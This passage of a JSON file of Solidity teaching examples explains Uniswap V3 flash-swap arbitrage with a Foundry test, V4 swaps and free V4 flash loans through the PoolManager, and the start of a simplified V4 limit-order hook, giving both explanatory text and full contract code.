%e\", profit);\n    }\n}\n\n```\n\n### Links\n\n<a href=\"https://github.com/foundry-rs/foundry\" target=\"__blank\">Foundry</a>\n\n<a href=\"https://github.com/t4sk/defi-notes\" target=\"__blank\">Uniswap V3 Foundry example</a>",
    "codes": [
      {
        "fileName": "UniswapV3FlashSwap.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n\ncontract UniswapV3FlashSwap {\n    ISwapRouter02 constant router = ISwapRouter02(SWAP_ROUTER_02);\n\n    uint160 private constant MIN_SQRT_RATIO = 4295128739;\n    uint160 private constant MAX_SQRT_RATIO =\n        1461446703485210103287273052203988822378723970342;\n\n    // DAI / WETH 0.3% swap fee (2000 DAI / WETH)\n    // DAI / WETH 0.05% swap fee (2100 DAI / WETH)\n    // 1. Flash swap on pool0 (receive WETH)\n    // 2. Swap on pool1 (WETH -> DAI)\n    // 3. Send DAI to pool0\n    // profit = DAI received from pool1 - DAI repaid to pool0\n\n    function flashSwap(\n        address pool0,\n        uint24 fee1,\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn\n    ) external {\n        bool zeroForOne = tokenIn < tokenOut;\n        // 0 -> 1 => sqrt price decrease\n        // 1 -> 0 => sqrt price increase\n        uint160 sqrtPriceLimitX96 =\n            zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1;\n\n        bytes memory data = abi.encode(\n            msg.sender, pool0, fee1, tokenIn, tokenOut, amountIn, zeroForOne\n        );\n\n        IUniswapV3Pool(pool0).swap({\n            recipient: address(this),\n            zeroForOne: zeroForOne,\n            amountSpecified: int256(amountIn),\n            sqrtPriceLimitX96: sqrtPriceLimitX96,\n            data: data\n        });\n    }\n\n    function _swap(\n        address tokenIn,\n        address tokenOut,\n        uint24 fee,\n        uint256 amountIn,\n        uint256 amountOutMin\n    ) private returns (uint256 amountOut) {\n        IERC20(tokenIn).approve(address(router), amountIn);\n\n        ISwapRouter02.ExactInputSingleParams memory params = ISwapRouter02\n            .ExactInputSingleParams({\n            tokenIn: tokenIn,\n            tokenOut: tokenOut,\n            fee: fee,\n            recipient: address(this),\n            amountIn: amountIn,\n            amountOutMinimum: amountOutMin,\n            sqrtPriceLimitX96: 0\n        });\n\n        amountOut = router.exactInputSingle(params);\n    }\n\n    function uniswapV3SwapCallback(\n        int256 amount0,\n        int256 amount1,\n        bytes calldata data\n    ) external {\n        // Decode data\n        (\n            address caller,\n            address pool0,\n            uint24 fee1,\n            address tokenIn,\n            address tokenOut,\n            uint256 amountIn,\n            bool zeroForOne\n        ) = abi.decode(\n            data, (address, address, uint24, address, address, uint256, bool)\n        );\n\n        uint256 amountOut = zeroForOne ? uint256(-amount1) : uint256(-amount0);\n\n        // pool0 -> tokenIn -> tokenOut (amountOut)\n        // Swap on pool 1 (swap tokenOut -> tokenIn)\n        uint256 buyBackAmount = _swap({\n            tokenIn: tokenOut,\n            tokenOut: tokenIn,\n            fee: fee1,\n            amountIn: amountOut,\n            amountOutMin: amountIn\n        });\n\n        // Repay pool 0\n        uint256 profit = buyBackAmount - amountIn;\n        require(profit > 0, \"profit = 0\");\n\n        IERC20(tokenIn).transfer(pool0, amountIn);\n        IERC20(tokenIn).transfer(caller, profit);\n    }\n}\n\ninterface ISwapRouter02 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactInputSingle(ExactInputSingleParams calldata params)\n        external\n        payable\n        returns (uint256 amountOut);\n}\n\ninterface IUniswapV3Pool {\n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\ninterface IWETH is IERC20 {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n"
      },
      {
        "fileName": "UniswapV3FlashSwapTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {\n    UniswapV3FlashSwap,\n    IUniswapV3Pool,\n    ISwapRouter02,\n    IERC20,\n    IWETH\n} from \"../../../src/defi/uniswap-v3-flash-swap/UniswapV3FlashSwap.sol\";\n\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant SWAP_ROUTER_02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\naddress constant DAI_WETH_POOL_3000 = 0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8;\naddress constant DAI_WETH_POOL_500 = 0x60594a405d53811d3BC4766596EFD80fd545A270;\nuint24 constant FEE_0 = 3000;\nuint24 constant FEE_1 = 500;\n\ncontract UniswapV3FlashTest is Test {\n    IERC20 private constant dai = IERC20(DAI);\n    IWETH private constant weth = IWETH(WETH);\n    ISwapRouter02 private constant router = ISwapRouter02(SWAP_ROUTER_02);\n    IUniswapV3Pool private constant pool0 = IUniswapV3Pool(DAI_WETH_POOL_3000);\n    IUniswapV3Pool private constant pool1 = IUniswapV3Pool(DAI_WETH_POOL_500);\n    UniswapV3FlashSwap private flashSwap;\n\n    uint256 private constant DAI_AMOUNT_IN = 10 * 1e18;\n\n    function setUp() public {\n        flashSwap = new UniswapV3FlashSwap();\n\n        // Create an arbitrage opportunity - make WETH cheaper on pool0\n        weth.deposit{value: 500 * 1e18}();\n        weth.approve(address(router), 500 * 1e18);\n        router.exactInputSingle(\n            ISwapRouter02.ExactInputSingleParams({\n                tokenIn: WETH,\n                tokenOut: DAI,\n                fee: FEE_0,\n                recipient: address(0),\n                amountIn: 500 * 1e18,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            })\n        );\n    }\n\n    function test_flashSwap() public {\n        uint256 bal0 = dai.balanceOf(address(this));\n        flashSwap.flashSwap({\n            pool0: address(pool0),\n            fee1: FEE_1,\n            tokenIn: DAI,\n            tokenOut: WETH,\n            amountIn: DAI_AMOUNT_IN\n        });\n        uint256 bal1 = dai.balanceOf(address(this));\n        uint256 profit = bal1 - bal0;\n        assertGt(profit, 0, \"profit = 0\");\n        console2.log(\"Profit %e\", profit);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v3",
      "swap",
      "arbitrage",
      "amm"
    ],
    "order": 7
  },
  {
    "slug": "uniswap-v4-swap",
    "title": "Uniswap V4 Swap",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Example of swapping tokens on Uniswap V4",
    "content": "Uniswap V4 introduces a singleton `PoolManager` that holds all pools in a single contract.\n\nKey differences from V3:\n\n- **Singleton architecture** - All pools live in one contract\n- **Flash accounting** - Token transfers only happen at the end, reducing gas\n- **unlock/unlockCallback pattern** - Interact via callbacks\n\nTo swap:\n\n1. Call `poolManager.unlock()` with encoded parameters\n2. PoolManager calls your `unlockCallback()`\n3. Inside callback: execute swap, settle inputs, take outputs\n4. Deltas must net to zero before unlock completes\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Uniswap V4 PoolManager on Ethereum mainnet\naddress constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n/// @notice Example of swapping on Uniswap V4 using the PoolManager directly\n/// @dev V4 uses a singleton PoolManager with unlock/unlockCallback pattern\ncontract UniswapV4Swap is IUnlockCallback {\n    IPoolManager public immutable poolManager;\n\n    error NotPoolManager();\n    error SwapFailed();\n\n    constructor() {\n        poolManager = IPoolManager(POOL_MANAGER);\n    }\n\n    /// @notice Swap exact input amount for output tokens\n    /// @param key The pool key identifying the pool\n    /// @param amountIn Amount of input tokens to swap\n    /// @param minAmountOut Minimum acceptable output amount\n    function swapExactInput(\n        PoolKey calldata key,\n        uint128 amountIn,\n        uint128 minAmountOut\n    ) external returns (uint256 amountOut) {\n        // Encode swap parameters to pass through unlock callback\n        bytes memory data = abi.encode(\n            SwapParams({\n                key: key,\n                amountIn: amountIn,\n                minAmountOut: minAmountOut,\n                zeroForOne: true,\n                sender: msg.sender\n            })\n        );\n\n        // Initiate the swap - PoolManager will call unlockCallback\n        bytes memory result = poolManager.unlock(data);\n        amountOut = abi.decode(result, (uint256));\n    }\n\n    /// @notice Callback from PoolManager after unlock\n    /// @dev This is where the actual swap logic executes\n    function unlockCallback(bytes calldata data)\n        external\n        override\n        returns (bytes memory)\n    {\n        if (msg.sender != address(poolManager)) revert NotPoolManager();\n\n        SwapParams memory params = abi.decode(data, (SwapParams));\n\n        // Execute the swap\n        // zeroForOne: true = token0 -> token1, false = token1 -> token0\n        // amountSpecified: negative = exact input, positive = exact output\n        BalanceDelta delta = poolManager.swap(\n            params.key,\n            IPoolManager.SwapParams({\n                zeroForOne: params.zeroForOne,\n                amountSpecified: -int256(uint256(params.amountIn)),\n                sqrtPriceLimitX96: params.zeroForOne\n                    ? MIN_SQRT_PRICE + 1\n                    : MAX_SQRT_PRICE - 1\n            }),\n            bytes(\"\")\n        );\n\n        // Calculate amounts from delta\n        // delta.amount0() is negative (we owe the pool)\n        // delta.amount1() is positive (pool owes us)\n        uint256 amountOut = params.zeroForOne\n            ? uint256(int256(delta.amount1()))\n            : uint256(int256(delta.amount0()));\n\n        if (amountOut < params.minAmountOut) revert SwapFailed();\n\n        // Settle the input token (pay what we owe)\n        Currency inputCurrency = params.zeroForOne\n            ? params.key.currency0\n            : params.key.currency1;\n\n        IERC20(Currency.unwrap(inputCurrency)).transferFrom(\n            params.sender,\n            address(poolManager),\n            params.amountIn\n        );\n        poolManager.settle(inputCurrency);\n\n        // Take the output token (receive what we're owed)\n        Currency outputCurrency = params.zeroForOne\n            ? params.key.currency1\n            : params.key.currency0;\n\n        poolManager.take(outputCurrency, params.sender, amountOut);\n\n        return abi.encode(amountOut);\n    }\n\n    struct SwapParams {\n        PoolKey key;\n        uint128 amountIn;\n        uint128 minAmountOut;\n        bool zeroForOne;\n        address sender;\n    }\n}\n\n// Sqrt price limits for swaps\nuint160 constant MIN_SQRT_PRICE = 4295128739;\nuint160 constant MAX_SQRT_PRICE =\n    1461446703485210103287273052203988822378723970342;\n\n// Currency is an address wrapper (address(0) = native ETH)\ntype Currency is address;\n\nlibrary CurrencyLibrary {\n    function unwrap(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n}\n\nusing CurrencyLibrary for Currency;\n\nstruct PoolKey {\n    Currency currency0;\n    Currency currency1;\n    uint24 fee;\n    int24 tickSpacing;\n    address hooks;\n}\n\n/// @notice Balance delta returned from swap operations\n/// @dev Negative = you owe the pool, Positive = pool owes you\ntype BalanceDelta is int256;\n\nlibrary BalanceDeltaLibrary {\n    function amount0(BalanceDelta delta) internal pure returns (int128) {\n        return int128(int256(BalanceDelta.unwrap(delta) >> 128));\n    }\n\n    function amount1(BalanceDelta delta) internal pure returns (int128) {\n        return int128(int256(BalanceDelta.unwrap(delta)));\n    }\n}\n\nusing BalanceDeltaLibrary for BalanceDelta;\n\ninterface IPoolManager {\n    struct SwapParams {\n        bool zeroForOne;\n        int256 amountSpecified;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function unlock(bytes calldata data) external returns (bytes memory);\n    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData)\n        external\n        returns (BalanceDelta);\n    function settle(Currency currency) external payable returns (uint256);\n    function take(Currency currency, address to, uint256 amount) external;\n}\n\ninterface IUnlockCallback {\n    function unlockCallback(bytes calldata data) external returns (bytes memory);\n}\n\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "UniswapV4Swap.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Uniswap V4 PoolManager on Ethereum mainnet\naddress constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;\naddress constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n/// @notice Example of swapping on Uniswap V4 using the PoolManager directly\n/// @dev V4 uses a singleton PoolManager with unlock/unlockCallback pattern\ncontract UniswapV4Swap is IUnlockCallback {\n    IPoolManager public immutable poolManager;\n\n    error NotPoolManager();\n    error SwapFailed();\n\n    constructor() {\n        poolManager = IPoolManager(POOL_MANAGER);\n    }\n\n    /// @notice Swap exact input amount for output tokens\n    /// @param key The pool key identifying the pool\n    /// @param amountIn Amount of input tokens to swap\n    /// @param minAmountOut Minimum acceptable output amount\n    function swapExactInput(\n        PoolKey calldata key,\n        uint128 amountIn,\n        uint128 minAmountOut\n    ) external returns (uint256 amountOut) {\n        // Encode swap parameters to pass through unlock callback\n        bytes memory data = abi.encode(\n            SwapParams({\n                key: key,\n                amountIn: amountIn,\n                minAmountOut: minAmountOut,\n                zeroForOne: true,\n                sender: msg.sender\n            })\n        );\n\n        // Initiate the swap - PoolManager will call unlockCallback\n        bytes memory result = poolManager.unlock(data);\n        amountOut = abi.decode(result, (uint256));\n    }\n\n    /// @notice Callback from PoolManager after unlock\n    /// @dev This is where the actual swap logic executes\n    function unlockCallback(bytes calldata data)\n        external\n        override\n        returns (bytes memory)\n    {\n        if (msg.sender != address(poolManager)) revert NotPoolManager();\n\n        SwapParams memory params = abi.decode(data, (SwapParams));\n\n        // Execute the swap\n        // zeroForOne: true = token0 -> token1, false = token1 -> token0\n        // amountSpecified: negative = exact input, positive = exact output\n        BalanceDelta delta = poolManager.swap(\n            params.key,\n            IPoolManager.SwapParams({\n                zeroForOne: params.zeroForOne,\n                amountSpecified: -int256(uint256(params.amountIn)),\n                sqrtPriceLimitX96: params.zeroForOne\n                    ? MIN_SQRT_PRICE + 1\n                    : MAX_SQRT_PRICE - 1\n            }),\n            bytes(\"\")\n        );\n\n        // Calculate amounts from delta\n        // delta.amount0() is negative (we owe the pool)\n        // delta.amount1() is positive (pool owes us)\n        uint256 amountOut = params.zeroForOne\n            ? uint256(int256(delta.amount1()))\n            : uint256(int256(delta.amount0()));\n\n        if (amountOut < params.minAmountOut) revert SwapFailed();\n\n        // Settle the input token (pay what we owe)\n        Currency inputCurrency = params.zeroForOne\n            ? params.key.currency0\n            : params.key.currency1;\n\n        IERC20(Currency.unwrap(inputCurrency)).transferFrom(\n            params.sender,\n            address(poolManager),\n            params.amountIn\n        );\n        poolManager.settle(inputCurrency);\n\n        // Take the output token (receive what we're owed)\n        Currency outputCurrency = params.zeroForOne\n            ? params.key.currency1\n            : params.key.currency0;\n\n        poolManager.take(outputCurrency, params.sender, amountOut);\n\n        return abi.encode(amountOut);\n    }\n\n    struct SwapParams {\n        PoolKey key;\n        uint128 amountIn;\n        uint128 minAmountOut;\n        bool zeroForOne;\n        address sender;\n    }\n}\n\n// Sqrt price limits for swaps\nuint160 constant MIN_SQRT_PRICE = 4295128739;\nuint160 constant MAX_SQRT_PRICE =\n    1461446703485210103287273052203988822378723970342;\n\n// Currency is an address wrapper (address(0) = native ETH)\ntype Currency is address;\n\nlibrary CurrencyLibrary {\n    function unwrap(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n}\n\nusing CurrencyLibrary for Currency;\n\nstruct PoolKey {\n    Currency currency0;\n    Currency currency1;\n    uint24 fee;\n    int24 tickSpacing;\n    address hooks;\n}\n\n/// @notice Balance delta returned from swap operations\n/// @dev Negative = you owe the pool, Positive = pool owes you\ntype BalanceDelta is int256;\n\nlibrary BalanceDeltaLibrary {\n    function amount0(BalanceDelta delta) internal pure returns (int128) {\n        return int128(int256(BalanceDelta.unwrap(delta) >> 128));\n    }\n\n    function amount1(BalanceDelta delta) internal pure returns (int128) {\n        return int128(int256(BalanceDelta.unwrap(delta)));\n    }\n}\n\nusing BalanceDeltaLibrary for BalanceDelta;\n\ninterface IPoolManager {\n    struct SwapParams {\n        bool zeroForOne;\n        int256 amountSpecified;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function unlock(bytes calldata data) external returns (bytes memory);\n    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData)\n        external\n        returns (BalanceDelta);\n    function settle(Currency currency) external payable returns (uint256);\n    function take(Currency currency, address to, uint256 amount) external;\n}\n\ninterface IUnlockCallback {\n    function unlockCallback(bytes calldata data) external returns (bytes memory);\n}\n\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v4",
      "swap",
      "amm",
      "poolmanager"
    ],
    "order": 8
  },
  {
    "slug": "uniswap-v4-flash",
    "title": "Uniswap V4 Flash Loan",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Example of flash loans on Uniswap V4",
    "content": "Uniswap V4 flash loans are **free** - no fees! This is possible due to flash accounting.\n\nHow it works:\n\n1. Call `poolManager.unlock()` to start\n2. In callback, call `poolManager.take()` to borrow tokens (creates a debt)\n3. Use the tokens for arbitrage, liquidations, collateral swaps, etc.\n4. Repay by transferring tokens back and calling `poolManager.settle()`\n5. As long as deltas net to zero, the transaction succeeds\n\nUnlike V3 which charged a fee on flash loans, V4's singleton architecture and flash accounting make borrowing essentially free - you only pay gas.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Uniswap V4 PoolManager on Ethereum mainnet\naddress constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;\n\n/// @notice Example of flash loans on Uniswap V4\n/// @dev V4 flash loans are FREE due to flash accounting - no fees!\n/// Borrow tokens during unlock callback, repay before callback ends\ncontract UniswapV4Flash is IUnlockCallback {\n    IPoolManager public immutable poolManager;\n\n    error NotPoolManager();\n    error FlashLoanFailed();\n\n    constructor() {\n        poolManager = IPoolManager(POOL_MANAGER);\n    }\n\n    /// @notice Execute a flash loan\n    /// @param currency The token to borrow (use address(0) for native ETH)\n    /// @param amount Amount to borrow\n    /// @param data Arbitrary data to pass to your flash loan logic\n    function flash(Currency currency, uint256 amount, bytes calldata data)\n        external\n    {\n        bytes memory callbackData = abi.encode(\n            FlashParams({\n                currency: currency,\n                amount: amount,\n                sender: msg.sender,\n                data: data\n            })\n        );\n\n        poolManager.unlock(callbackData);\n    }\n\n    /// @notice Callback from PoolManager - execute flash loan logic here\n    function unlockCallback(bytes calldata callbackData)\n        external\n        override\n        returns (bytes memory)\n    {\n        if (msg.sender != address(poolManager)) revert NotPoolManager();\n\n        FlashParams memory params = abi.decode(callbackData, (FlashParams));\n\n        // Take tokens from the pool (creates a debt)\n        poolManager.take(params.currency, address(this), params.amount);\n\n        // ============================================\n        // Your flash loan logic goes here!\n        // You now have the borrowed tokens to use\n        // ============================================\n\n        // Example: call custom logic\n        _executeFlashLoanLogic(params.currency, params.amount, params.data);\n\n        // ============================================\n        // Repay the flash loan\n        // ============================================\n\n        // For ERC20: transfer tokens to PoolManager, then settle\n        if (!isNative(params.currency)) {\n            IERC20(Currency.unwrap(params.currency)).transfer(\n                address(poolManager),\n                params.amount\n            );\n            poolManager.settle(params.currency);\n        } else {\n            // For native ETH: settle with value\n            poolManager.settle{value: params.amount}(params.currency);\n        }\n\n        // No fees! Delta is now zero, unlock will succeed\n        return bytes(\"\");\n    }\n\n    /// @notice Override this to implement your flash loan logic\n    function _executeFlashLoanLogic(\n        Currency currency,\n        uint256 amount,\n        bytes memory data\n    ) internal virtual {\n        // Example: arbitrage, liquidation, collateral swap, etc.\n        // The borrowed tokens are in this contract\n    }\n\n    function isNative(Currency currency) internal pure returns (bool) {\n        return Currency.unwrap(currency) == address(0);\n    }\n\n    // Allow receiving ETH\n    receive() external payable {}\n\n    struct FlashParams {\n        Currency currency;\n        uint256 amount;\n        address sender;\n        bytes data;\n    }\n}\n\n// Currency is an address wrapper (address(0) = native ETH)\ntype Currency is address;\n\nlibrary CurrencyLibrary {\n    function unwrap(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n}\n\nusing CurrencyLibrary for Currency;\n\ninterface IPoolManager {\n    function unlock(bytes calldata data) external returns (bytes memory);\n    function settle(Currency currency) external payable returns (uint256);\n    function take(Currency currency, address to, uint256 amount) external;\n}\n\ninterface IUnlockCallback {\n    function unlockCallback(bytes calldata data) external returns (bytes memory);\n}\n\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\n```",
    "codes": [
      {
        "fileName": "UniswapV4Flash.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Uniswap V4 PoolManager on Ethereum mainnet\naddress constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;\n\n/// @notice Example of flash loans on Uniswap V4\n/// @dev V4 flash loans are FREE due to flash accounting - no fees!\n/// Borrow tokens during unlock callback, repay before callback ends\ncontract UniswapV4Flash is IUnlockCallback {\n    IPoolManager public immutable poolManager;\n\n    error NotPoolManager();\n    error FlashLoanFailed();\n\n    constructor() {\n        poolManager = IPoolManager(POOL_MANAGER);\n    }\n\n    /// @notice Execute a flash loan\n    /// @param currency The token to borrow (use address(0) for native ETH)\n    /// @param amount Amount to borrow\n    /// @param data Arbitrary data to pass to your flash loan logic\n    function flash(Currency currency, uint256 amount, bytes calldata data)\n        external\n    {\n        bytes memory callbackData = abi.encode(\n            FlashParams({\n                currency: currency,\n                amount: amount,\n                sender: msg.sender,\n                data: data\n            })\n        );\n\n        poolManager.unlock(callbackData);\n    }\n\n    /// @notice Callback from PoolManager - execute flash loan logic here\n    function unlockCallback(bytes calldata callbackData)\n        external\n        override\n        returns (bytes memory)\n    {\n        if (msg.sender != address(poolManager)) revert NotPoolManager();\n\n        FlashParams memory params = abi.decode(callbackData, (FlashParams));\n\n        // Take tokens from the pool (creates a debt)\n        poolManager.take(params.currency, address(this), params.amount);\n\n        // ============================================\n        // Your flash loan logic goes here!\n        // You now have the borrowed tokens to use\n        // ============================================\n\n        // Example: call custom logic\n        _executeFlashLoanLogic(params.currency, params.amount, params.data);\n\n        // ============================================\n        // Repay the flash loan\n        // ============================================\n\n        // For ERC20: transfer tokens to PoolManager, then settle\n        if (!isNative(params.currency)) {\n            IERC20(Currency.unwrap(params.currency)).transfer(\n                address(poolManager),\n                params.amount\n            );\n            poolManager.settle(params.currency);\n        } else {\n            // For native ETH: settle with value\n            poolManager.settle{value: params.amount}(params.currency);\n        }\n\n        // No fees! Delta is now zero, unlock will succeed\n        return bytes(\"\");\n    }\n\n    /// @notice Override this to implement your flash loan logic\n    function _executeFlashLoanLogic(\n        Currency currency,\n        uint256 amount,\n        bytes memory data\n    ) internal virtual {\n        // Example: arbitrage, liquidation, collateral swap, etc.\n        // The borrowed tokens are in this contract\n    }\n\n    function isNative(Currency currency) internal pure returns (bool) {\n        return Currency.unwrap(currency) == address(0);\n    }\n\n    // Allow receiving ETH\n    receive() external payable {}\n\n    struct FlashParams {\n        Currency currency;\n        uint256 amount;\n        address sender;\n        bytes data;\n    }\n}\n\n// Currency is an address wrapper (address(0) = native ETH)\ntype Currency is address;\n\nlibrary CurrencyLibrary {\n    function unwrap(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n}\n\nusing CurrencyLibrary for Currency;\n\ninterface IPoolManager {\n    function unlock(bytes calldata data) external returns (bytes memory);\n    function settle(Currency currency) external payable returns (uint256);\n    function take(Currency currency, address to, uint256 amount) external;\n}\n\ninterface IUnlockCallback {\n    function unlockCallback(bytes calldata data) external returns (bytes memory);\n}\n\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "uniswap",
      "v4",
      "flash",
      "loan",
      "amm",
      "poolmanager"
    ],
    "order": 9
  },
  {
    "slug": "uniswap-v4-limit-order",
    "title": "Uniswap V4 Limit Order",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Example of a limit order hook for Uniswap V4",
    "content": "Uniswap V4 hooks allow custom logic to execute during the swap lifecycle. This example demonstrates a limit order hook using `afterSwap`.\n\nHow limit orders work with hooks:\n\n1. Users call `placeLimitOrder()` specifying a tick (price) and direction\n2. Tokens are held by the hook contract\n3. When swaps move the price past the target tick, `afterSwap` is triggered\n4. The hook detects filled orders and executes them\n5. Users receive their swapped tokens\n\nKey hook concepts:\n\n- **Permissions** - `getHookPermissions()` declares which hooks you implement\n- **Hook address** - Must have specific bits set based on permissions (use CREATE2)\n- **Callbacks** - PoolManager calls your hook at each lifecycle point\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/// @notice Simplified Uniswap V4 Limit Order Hook\n/// @dev Hooks allow custom logic to execute during swap lifecycle\n/// This example demonstrates a basic limit order mechanism using afterSwap\ncontract LimitOrderHook is IHooks {\n    IPoolManager public immutable poolManager;\n\n    // Mapping: poolId => tick => zeroForOne => total liquidity\n    mapping(bytes32 => mapping(int24 => mapping(bool => uint256))) public tickLiquidity;\n\n    // Mapping: poolId => tick => zeroForOne => user => liquidity\n    mapping(bytes32 => mapping(int24 => mapping(bool => mapping(address => uint256))))\n        public userPositions;\n\n    error NotPoolManager();\n    error InvalidTick();\n\n    constructor(IPoolManager _poolManager) {\n        poolManager = _poolManager;\n    }\n\n    /// @notice Place a limit order at a specific tick\n    /// @param key The pool to place the order in\n    /// @param tick The tick (price point) for the limit order\n    /// @param zeroForOne true = sell token0 for token1, false = sell token1 for token0\n    /// @param amount Amount of tokens to sell\n    function placeLimitOrder(\n        PoolKey calldata key,\n        int24 tick,\n        bool zeroForOne,\n        uint256 amount\n    ) external {\n        // Validate tick is on the correct side of current price\n        (, int24 currentTick,,) = poolManager.getSlot0(toId(key));\n\n        // For selling token0: tick must be above current (price goes up)\n        // For selling token1: tick must be below current (price goes down)\n        if (zeroForOne && tick <= currentTick) revert InvalidTick();\n        if (!zeroForOne && tick >= currentTick) revert InvalidTick();\n\n        bytes32 poolId = toId(key);\n\n        // Transfer tokens from user\n        Currency currency = zeroForOne ? key.currency0 : key.currency1;\n        IERC20(Currency.unwrap(currency)).transferFrom(\n            msg.sender,\n            address(this),\n            amount\n        );\n\n        // Record the position\n        tickLiquidity[poolId][tick][zeroForOne] += amount;\n        userPositions[poolId][tick][zeroForOne][msg.sender] += amount;\n    }\n\n    /// @notice Called by PoolManager after every swap\n    /// @dev Check if price crossed any limit order ticks and execute them\n    function afterSwap(\n        address,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        BalanceDelta,\n        bytes calldata\n    ) external override returns (bytes4, int128) {\n        if (msg.sender != address(poolManager)) revert NotPoolManager();\n\n        (, int24 currentTick,,) = poolManager.getSlot0(toId(key));\n        bytes32 poolId = toId(key);\n\n        // Check if any limit orders at this tick should be filled\n        // zeroForOne swaps move price down, so check sell-token1 orders\n        // !zeroForOne swaps move price up, so check sell-token0 orders\n        bool checkZeroForOne = !params.zeroForOne;\n\n        uint256 liquidity = tickLiquidity[poolId][currentTick][checkZeroForOne];\n\n        if (liquidity > 0) {\n            // Execute limit orders at this tick\n            _executeLimitOrders(key, currentTick, checkZeroForOne, liquidity);\n        }\n\n        return (IHooks.afterSwap.selector, 0);\n    }\n\n    /// @notice Execute limit orders at a specific tick\n    function _executeLimitOrders(\n        PoolKey calldata key,\n        int24 tick,\n        bool zeroForOne,\n        uint256 amount\n    ) internal {\n        // In a full implementation, this would:\n        // 1. Swap the tokens using poolManager.swap()\n        // 2. Distribute output tokens to limit order placers\n        // 3. Clear the filled positions\n\n        bytes32 poolId = toId(key);\n\n        // Clear the tick liquidity (orders are filled)\n        tickLiquidity[poolId][tick][zeroForOne] = 0;\n\n        // Emit event for off-chain tracking\n        emit LimitOrderFilled(poolId, tick, zeroForOne, amount);\n    }\n\n    /// @notice Users can cancel unfilled limit orders\n    function cancelLimitOrder(\n        PoolKey calldata key,\n        int24 tick,\n        bool zeroForOne\n    ) external {\n        bytes32 poolId = toId(key);\n        uint256 amount = userPositions[poolId][tick][zeroForOne][msg.sender];\n\n        require(amount > 0, \"No position\");\n\n        // Clear position\n        userPositions[poolId][tick][zeroForOne][msg.sender] = 0;\n        tickLiquidity[poolId][tick][zeroForOne] -= amount;\n\n        // Return tokens\n        Currency currency = zeroForOne ? key.currency0 : key.currency1;\n        IERC20(Currency.unwrap(currency)).transfer(msg.sender, amount);\n    }\n\n    /// @notice Return hook permissions - we only need afterSwap\n    function getHookPermissions() public pure returns (Hooks.Permissions memory) {\n        return Hooks.Permissions({\n            beforeInitialize: false,\n            afterInitialize: false,\n            beforeAddLiquidity: false,\n            afterAddLiquidity: false,\n            beforeRemoveLiquidity: false,\n            